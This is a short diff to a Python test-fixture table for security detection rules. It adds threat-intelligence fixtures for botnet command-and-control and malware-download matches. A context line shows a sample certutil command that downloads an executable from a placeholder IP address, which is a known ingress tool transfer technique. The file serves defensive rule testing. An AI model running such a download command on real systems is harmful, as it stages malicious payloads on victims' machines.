@@ -174,6 +174,16 @@ RULE_FIXTURES = {
         {"syscall": "setuid", "success": "yes"},
         {"event_type": "sudo", "result": "success"},
     ),
+    "threat_intel_known_c2": (
+        "selection",
+        {"threat": {"matched": True, "threat_types": ["botnet_cc"]}},
+        {"threat": {"matched": True, "threat_types": ["phishing"]}},
+    ),
+    "threat_intel_malware_delivery": (
+        "selection_download",
+        {"threat": {"matched": True, "threat_types": ["malware_download"]}},
+        {"threat": {"matched": True, "threat_types": ["botnet_cc"]}},
+    ),
     "command_and_control_ingress_tool_transfer": (
         "selection_certutil",
         {"command_line": "certutil.exe -urlcache -split -f http://203.0.113.66/p.exe p.exe"},
